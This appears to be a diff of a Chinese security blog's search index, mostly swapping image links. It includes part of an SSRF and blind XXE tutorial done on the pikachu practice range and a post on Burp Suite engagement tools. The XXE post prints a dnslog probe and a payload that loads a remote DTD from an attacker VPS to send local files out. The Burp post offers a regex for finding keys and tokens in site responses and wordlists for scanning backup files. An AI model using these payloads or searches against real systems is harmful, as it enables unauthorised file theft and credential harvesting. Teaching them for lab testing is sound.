 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;hfsy89.ceye.io</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121638-7b0e9248-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138771739.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121638-7b0e9248-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508247159.png" alt="img"></a></p>
 <p>然后看我们的dnslog平台是否有服务器的IP来判断,这里就有可能有SSRF漏洞。</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121702-8966768a-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138808365.png" alt="img"></a><br>但是要特别注意一点：<br>这样不能证明它一定能请求到内网，比如一些业务场景如人脸识别、图床、或者需要去外部加载资源等等，本身限制了访问内网ip，但是dnslog是在外网的，本身就可以访问的到。所以这里还有待继续研究。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121702-8966768a-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508274908.png" alt="img"></a><br>但是要特别注意一点：<br>这样不能证明它一定能请求到内网，比如一些业务场景如人脸识别、图床、或者需要去外部加载资源等等，本身限制了访问内网ip，但是dnslog是在外网的，本身就可以访问的到。所以这里还有待继续研究。</p>
 <h3 id="3-5-无回显的XXE（Blind-XXE）"><a href="#3-5-无回显的XXE（Blind-XXE）" class="headerlink" title="3.5.无回显的XXE（Blind XXE）"></a>3.5.无回显的XXE（Blind XXE）</h3><h4 id="3-5-1-介绍"><a href="#3-5-1-介绍" class="headerlink" title="3.5.1.介绍"></a>3.5.1.介绍</h4><p>XXE漏洞全称（X ML External Entity Injection）即X ML外部实体注入漏洞，XXE漏洞发生在应用程序解析X ML输入时，没有禁止外部实体的加载（下面会介绍），导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p>
 <p>那么来介绍介绍外部实体的加载：</p>
 <p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。</p>
@@ -323,18 +1140,18 @@
 <h4 id="3-5-2-过程"><a href="#3-5-2-过程" class="headerlink" title="3.5.2.过程"></a>3.5.2.过程</h4><p>这里我以pikachu靶场为例：</p>
 <p>1.修改源码</p>
 <p>我们将源码中的输出语句进行注释，构成Blind XXE</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120008-2d00203c-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138858776.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120008-2d00203c-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508323420.png" alt="img"></a></p>
 <p>这样再进行判断是否能输出解析的X ML语句，如下页面中就看到不了hi了</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120036-3d5e175e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138877460.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120036-3d5e175e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508346390.png" alt="img"></a></p>
 <p>原本没修改源码前是可以看到的</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120058-4a95febe-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138907581.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120058-4a95febe-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508367143.png" alt="img"></a></p>
 <p>2.漏洞验证</p>
 <p>在输入框中提交dnslog测试的语句</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?X ML version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;gb2312&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY xi SYSTEM &quot;http:&#x2F;&#x2F;hfsy89.ceye.io&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;ξ&lt;&#x2F;login&gt;&lt;secret&gt;Any bugs?&lt;&#x2F;secret&gt;&lt;&#x2F;reset&gt;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120120-576eaf00-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138934047.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120120-576eaf00-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508396525.png" alt="img"></a></p>
 <p>然后去dnslog平台上查看，看到接收到了信息，说明漏洞真的存在</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120142-64d6ef0e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138957377.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120142-64d6ef0e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508411944.png" alt="img"></a></p>
 <p>3.文件读取</p>
 <p>这里需要一个VPS，VPS中放入一个DTD的文件，并在该文件所在目录开启一个web服务，我这里用的是python开启的</p>
 <p>a.dtd文件内如下:</p>
@@ -344,20 +1161,20 @@
 <p>python开启web服务，监听11111端口</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 11111</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120208-743d1342-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138985237.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120208-743d1342-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/1649850846336.png" alt="img"></a></p>
 <p>这样就可以通过本机去访问这个web服务</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120257-918b3d66-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139006791.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120257-918b3d66-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/1649850849237.png" alt="img"></a></p>
 <p>然后再用python再开启一个端口，接收读取的目标服务器的数据，这里监听的是上面文件中写的6666端口</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120313-9ada9a92-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139022835.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120313-9ada9a92-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508523801.png" alt="img"></a></p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?X ML version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;gb2312&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;vps ip:web端口&#x2F;a.dtd&quot;&gt;</span><br><span class="line">%xxe;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120325-a268683e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139065207.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120325-a268683e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508557966.png" alt="img"></a></p>
 <p>burp suite提交数据后，可能会无响应，这时只要刷新一下浏览器所在的web服务界面就行</p>
 <p>查看接收的数据</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120339-aa9f0e9a-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139103220.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120339-aa9f0e9a-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508582021.png" alt="img"></a></p>
 <p>我们将这个数据进行b ase64解码后查看，就是我们主机上的文件</p>
-<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120400-b6c7e412-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139128777.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120400-b6c7e412-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220413/16498508609426.png" alt="img"></a></p>
 <p>通过这样的方式，我们可以一直进行文件读取，直到读取到有用的数据，比如说公钥文件，就可能能进行远程连接ssh。</p>
 <p>参考链接：</p>
 <p><a href="https://www.cnblogs.com/-qing-/p/10623583.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10623583.html</a></p>
@@ -368,12 +1185,144 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>dnslog</tag>
+        <tag>DNSlog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅析Burpsuite作战工具</title>
+    <url>/2022/03/20/burpSuite%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h2 id="浅析Burpsuite作战工具"><a href="#浅析Burpsuite作战工具" class="headerlink" title="浅析Burpsuite作战工具"></a>浅析Burpsuite作战工具</h2><p>直入burp右键菜单中的Engagement tools，中文翻译为作战工具。</p>
+<p><img src="https://image.3001.net/images/20220413/16498506097226.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>从上往下依次为</p>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Search                        搜索 </span><br><span class="line">Find Comments                 查找注释 </span><br><span class="line">Find scripts                  查找js代码 </span><br><span class="line">Find references               查找引用 </span><br><span class="line">Analyze target                分析目标 </span><br><span class="line">Discover content              内容勘测 </span><br><span class="line">Schedule </span><br><span class="line">task                 定时任务 </span><br><span class="line">Simulate manual testing       人工模拟</span><br></pre></td></tr></table></figure>
+
+<p>以上翻译属于个人理解，非字面意思。如有不同见解，欢迎交流。</p>
+<p>依次聊一下个人的使用心得：</p>
+<h3 id="0x01-Search-搜索"><a href="#0x01-Search-搜索" class="headerlink" title="0x01 Search 搜索"></a>0x01 Search 搜索</h3><p>在选定的上右键打开后默认如下：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506123047.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>输入字符串即可查找需要的字符串，相当于浏览器view-source后再Ctrl + F查找字符串。</p>
+<p>如果只用到这里的话有点不太黑阔，正则搜索这么强大，不用可惜了。</p>
+<p>贴一条自己常用的正则：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.user|pass|accessKeyId|accessKeySecret|secretToken|callback|admin|config|key|access|token?)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220413/16498506166958.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>擅用该功能，在SRC捡洞可能可能只是一个习惯而已。（比如每次准备关Burp之前考虑全选site map中所有的站点，再拿正则去尝试一下。）</p>
+<h3 id="0x02-Find-Comments-查找注释"><a href="#0x02-Find-Comments-查找注释" class="headerlink" title="0x02 Find Comments 查找注释"></a>0x02 Find Comments 查找注释</h3><p>选择目标右键打开后如下图：</p>
+<p><img src="https://image.3001.net/images/20220413/1649850618323.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p><img src="https://image.3001.net/images/20220413/1649850621151.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>可以理解为Search功能的正则写为:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--(.*?)--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不同语言的注释不一样，burp内置的正则更为全面。测试过程中适当看一下注释内容，没准一个未授权就出来了。</p>
+<h3 id="0x03-Find-scripts-查找js代码"><a href="#0x03-Find-scripts-查找js代码" class="headerlink" title="0x03 Find scripts 查找js代码"></a>0x03 Find scripts 查找js代码</h3><p>选择目标右键打开后如下图：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506248899.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p><img src="https://image.3001.net/images/20220413/16498506276749.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>该功能处理.js后缀的文件之外，页面中script标签的内容也会自动匹配出来。等同于右键看完当前页面的js逻辑后在接着Ctrl F 搜.js然后继续看代码，在Burp里相对方便得多。</p>
+<h3 id="0x04-Find-references-查找引用"><a href="#0x04-Find-references-查找引用" class="headerlink" title="0x04 Find references 查找引用"></a>0x04 Find references 查找引用</h3><p>选择目标右键打开后如下图：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506306909.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p><img src="https://image.3001.net/images/20220413/16498506337425.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>如果用过<a href="http://cn-sec.com/wp-content/themes/begin-lts-1/inc/go.php?url=https://github.com/TheKingOfDuck/myScripts/tree/master/LinksDumper" target="_blank" rel="noopener">LinksDumper</a>的话会发现Burp这个功能和它一模一样，都是匹配出页面中存在的各类链接。</p>
+<p>默认自带的功能还有不少人是去用插件或者用独立的程序跑。burp自带的它不香咩？</p>
+<h3 id="0x05-Analyze-target-分析目标"><a href="#0x05-Analyze-target-分析目标" class="headerlink" title="0x05 Analyze target 分析目标"></a>0x05 Analyze target 分析目标</h3><p>选择目标右键打开后总共有四个页面</p>
+<p>1.总结页面：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506356060.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>假设拿到100个目标，筛选软柿子的时候通过总结页面判断一下，寻找交互点多的站点/链接进行单点突破，未尝不是一个高效的选择。</p>
+<p>2.动态Urls：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506384370.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>该功能可以快速筛选出带外部参数的url，并统计了参数的数量，秉着交互点越多可能存在的问题就越多的原则，筛选一下，效率++。</p>
+<p>3.其他Url：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506415433.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>该功能可以理解为Find references功能遍历出来所有的连接后再去除Dynamic URLs中带交互点的Url的结果。</p>
+<p>4.参数统计：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506448640.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>首先是统计了出现过那些参数，其次是这些参数在Url里面出现过次数。有了这个功能在瓶颈渗透提取本站存在的参数时根本不需要第三方插件工具辅助，直接复制name字段即可；某个参数存在漏洞后也可通过该功能查找其他可能存在相同问题的Url。</p>
+<h3 id="0x06-Discover-content-内容勘测"><a href="#0x06-Discover-content-内容勘测" class="headerlink" title="0x06 Discover content 内容勘测"></a>0x06 Discover content 内容勘测</h3><p>该功能秒杀一切目录扫描工具。</p>
+<p>下面是关于如何巧用它去递归扫描站点备份的：</p>
+<p>此前在米斯特<code>BurpSuite 插件生态开发组</code>里有提到想开发一款主动的备份扫描插件，寄生于<code>BurpSuite</code>强大的爬虫功能对每个目录/文件进行备份扫描。写一半发现<code>BurpSuite</code>本来就有这样的功能，只是很少有人用到罢了，本文仅对相关功能进行简要的分析以及优化。</p>
+<h4 id="0x06-1-简介"><a href="#0x06-1-简介" class="headerlink" title="0x06_1 简介"></a>0x06_1 简介</h4><p>正常访问时爬虫被动收集到的目录:</p>
+<p><img src="https://image.3001.net/images/20220413/16498506473805.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>下面是本文的主角：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506504150.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>位于<code>Engagement tools</code> ==&gt; <code>Discover content</code></p>
+<p>看看默认配置：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506522751.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>图中圈起来的第一部分默认勾选了burp内置的四个字典,第二个圈也是默认配置,其作用时从站点中提取各种目录并递归扫描,前面的配置可根据情况修改,后面不建议动它。</p>
+<p><img src="https://image.3001.net/images/20220413/16498506558668.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>默认配置就是这四项了，下面具体分析一下他扫描的流量，取其精华。</p>
+<h4 id="0x06-2-扫描分析"><a href="#0x06-2-扫描分析" class="headerlink" title="0x06_2 扫描分析"></a>0x06_2 扫描分析</h4><p>流程1:</p>
+<p><img src="https://image.3001.net/images/20220413/16498506591845.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>先去除所有文件的后缀以及提取目录名当作文件扫一遍。</p>
+<p>流程2:</p>
+<p><img src="https://image.3001.net/images/20220413/16498506613978.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>在所有去了后缀的文件名后面加上<code>Test these extentsions</code>配置中的所有后缀并进行扫描，在已知站点语言的情况下此处明显多了很多无效流量。</p>
+<p>流程3:</p>
+<p><img src="https://image.3001.net/images/20220413/16498506643725.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>将流程1中的所有文件名当作目录扫一遍。</p>
+<p>流程4:</p>
+<p><img src="https://image.3001.net/images/20220413/164985066725.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>按照配置中Filenames中的字典顺序依次遍历并结合流程2的方式遍历文件。</p>
+<p>流程5:</p>
+<p>依次在每层目录执行一遍流程1-4，如果新目录或文件发现就添加到列队里面。</p>
+<h4 id="0x06-3-优化扫描"><a href="#0x06-3-优化扫描" class="headerlink" title="0x06_3 优化扫描"></a>0x06_3 优化扫描</h4><p><img src="https://image.3001.net/images/20220413/16498506696174.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>缺陷很明显，仅仅三个目录三个文件总共请求了14048次，流量超过20M。</p>
+<p>递归扫描产生的无效流量太多了。</p>
+<p>首要原因出现在:</p>
+<p><img src="https://image.3001.net/images/20220413/1649850672958.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>大多数时候，已知语言情况下完全没必要吧所有后缀都跑一遍，留特定语言以及相关后缀。如st2时加上.action/.do,流量去掉大半。</p>
+<p>其次出现在:</p>
+<p><img src="https://image.3001.net/images/20220413/16498506748207.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>此处主要针对扫备份，原生字典长这样:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bac BAC backup BACKUP bak BAK conf cs csproj gz inc INC ini java log lst old OLD orig ORIG sav save tar temp tmp TMP vb vbproj zip $$$ -OLD -old 0 1 ~1 ~bk</span><br></pre></td></tr></table></figure>
+
+<p>主要针对国外的站吧。这里提供一份。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">txt md xml db 7z rar zip gz tar tar.gz sql bak swp old properties inc ini mdb mdf conf config log rar</span><br></pre></td></tr></table></figure>
+
+<p>最后是字典的选择：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506766428.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>burp内置的4个字典内容重复率极高，比如about这个词在四个字典里都分别出现了…四个字典共3266个，去重后2265个。</p>
+<p>结果保存在：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;TheKingOfDuck&#x2F;myScripts&#x2F;master&#x2F;burp_dir.txt</span><br></pre></td></tr></table></figure>
+
+<p>文件名方面推荐：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;TheKingOfDuck&#x2F;myScripts&#x2F;master&#x2F;burp_filenames.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220413/16498506792225.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>如此一来在扫描目录的过程也可把备份一并扫了。</p>
+<p><img src="https://image.3001.net/images/20220413/16498506827458.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<h3 id="0x07-Schedule-task-定时任务"><a href="#0x07-Schedule-task-定时任务" class="headerlink" title="0x07 Schedule task 定时任务"></a>0x07 Schedule task 定时任务</h3><p>选择目标右键打开后如下图：</p>
+<p><img src="https://image.3001.net/images/20220413/16498506857455.png" alt="BurpSuite系列  基础技巧（一）"><img src="https://image.3001.net/images/20220413/16498506959858.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>定时任务，没啥特别的值得说。</p>
+<h3 id="0x08-Simulate-manual-testing-人工模拟"><a href="#0x08-Simulate-manual-testing-人工模拟" class="headerlink" title="0x08 Simulate manual testing 人工模拟"></a>0x08 Simulate manual testing 人工模拟</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This function sends common test payloads to random URL s and parameters at irregular intervals, to generate traflic similar to that caused by manual penetration testing. Its only real use is to let you take a break from testing while still looking busy according to the server&#39;s logs. Only items which you selected in the site map will be requested.</span><br></pre></td></tr></table></figure>
+
+<p>正如功能描述中所说的，这是一个懒人挖洞选项。</p>
+<p><img src="https://image.3001.net/images/20220413/16498507016382.png" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>缺陷很明显，不会自动寻找并提交表单，只能依托于已有的表单/参数的基础上进行探测，相当于一款被动扫描器。结合Discover content使用，法力无边。</p>
+<h3 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h3><p>熟练使用这些作战功能，扫描器从此是路人。</p>
+<h2 id="配置Intruder预定义Payload列表"><a href="#配置Intruder预定义Payload列表" class="headerlink" title="配置Intruder预定义Payload列表"></a>配置Intruder预定义Payload列表</h2><p>预定义Payload列表在这里可以看见：</p>
+<p><img src="https://image.3001.net/images/20220413/16498507046772.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>在Tab栏中有选项可以配置-<code>Configure predefined payload lists</code>：</p>
+<p><img src="https://image.3001.net/images/20220413/16498507117572.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>选择Payload列表目录（注：<strong>需将常用的字典都放在一个目录里面</strong>）：</p>
+<p><img src="https://image.3001.net/images/20220413/1649850713307.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<h2 id="自定义插入点进行扫描"><a href="#自定义插入点进行扫描" class="headerlink" title="自定义插入点进行扫描"></a>自定义插入点进行扫描</h2><p>将请求报文转发至Intruder，选择扫描的插入点：<code>Add$</code></p>
+<p><img src="https://image.3001.net/images/20220413/16498507166935.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<p>右键选择<code>Scan defined insertion points</code></p>
+<p><img src="https://image.3001.net/images/20220413/16498507189300.jpg" alt="BurpSuite系列  基础技巧（一）"></p>
+<hr>
+<p>参考链接：<a href="https://gh0st.cn/archives/2020-02-13/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2020-02-13/1</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Burpsuite</tag>
       </tags>
   </entry>
   <entry>
     <title>burpsuite 配置xray代理</title>
-    <url>/2022/03/15/burp%E4%B8%8Exray%E8%81%94%E5%8A%A8/</url>
+    <url>/2022/03/20/burp%E4%B8%8Exray%E8%81%94%E5%8A%A8/</url>
     <content><![CDATA[<h3 id="burpsuite-配置xray代理"><a href="#burpsuite-配置xray代理" class="headerlink" title="burpsuite 配置xray代理"></a>burpsuite 配置xray代理</h3><p>首先 xray 建立起 webscan 的监听</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output output.html</span><br></pre></td></tr></table></figure>
 
@@ -382,7 +1331,7 @@
 
 <p>进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。</p>
 <p>点击 Add 添加上游代理以及作用域，Destination host处可以使用*匹配多个任意字符串，?匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
-<p><img src="https://image.3001.net/images/20220316/16474135659441.png" alt="image-20210803143717759"></p>
+<p><img src="https://image.3001.net/images/20220413/16498505822164.png" alt="image-20210803143717759"></p>
 <p>如果需要抓取https流量则需要brup以及xray都安装https证书。</p>
 <h3 id="xray生成证书"><a href="#xray生成证书" class="headerlink" title="xray生成证书"></a>xray生成证书</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\xray.exe geca</span><br></pre></td></tr></table></figure>
 
@@ -391,8 +1340,8 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>burpsuite</tag>
+        <tag>xray</tag>
       </tags>
   </entry>
   <entry>
